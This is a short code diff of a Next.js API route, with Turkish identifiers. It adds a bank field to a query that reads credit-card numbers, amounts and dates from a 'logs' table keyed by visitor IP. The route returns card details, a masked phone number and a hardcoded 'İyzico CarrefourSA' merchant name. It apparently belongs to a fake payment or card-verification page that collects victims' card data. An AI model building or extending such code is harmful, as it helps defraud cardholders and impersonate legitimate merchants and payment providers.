@@ -22,7 +22,7 @@ export async function GET(request: NextRequest) {
 
         // logs tablosundan verileri al
         const [logRows] = await pool.query(
-            'SELECT kredi_karti, tutar, tarih FROM logs WHERE ip = ?',
+            'SELECT kredi_karti, tutar, tarih, banka FROM logs WHERE ip = ?',
             [ip]
         ) as any[];
 
@@ -103,7 +103,8 @@ export async function GET(request: NextRequest) {
                 lastFourDigits,
                 cardType,
                 maskedPhone,
-                isyeriAdi: 'İyzico CarrefourSA'
+                isyeriAdi: 'İyzico CarrefourSA',
+                banka: log.banka || ''
             }
         });
     } catch (error: any) {
